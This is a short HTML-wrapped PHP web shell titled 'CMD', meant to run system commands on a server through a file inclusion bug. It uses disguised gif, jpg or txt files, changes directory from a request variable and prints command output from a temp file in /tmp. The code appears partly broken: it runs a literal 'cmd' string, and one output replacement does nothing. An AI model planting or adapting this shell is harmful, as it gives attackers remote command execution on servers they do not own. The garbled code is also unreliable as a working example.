<span style="font-family; verdana; font-size: xx-large;"><strong>CMD</strong> - system comand
</span>
<span style="font-family; verdana; font-size: xx-small;">
<hr>
<pre><span style="font-family; verdana; font-size: xx-small;">
	<?
	//cmd - to execute command on file injection bug (gif - jpg - txt)
	if (isset($chdir)) @chdir($chdir);
	ob_start();
	system("cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
	$output = ob_get_contents();
	ob_end_clean();
	if (!empty($output)) echo str_replace(">", ">", str_replace("< ",  "<", $output));
	?>
	</span></pre>
	<hr>
	</span>
	
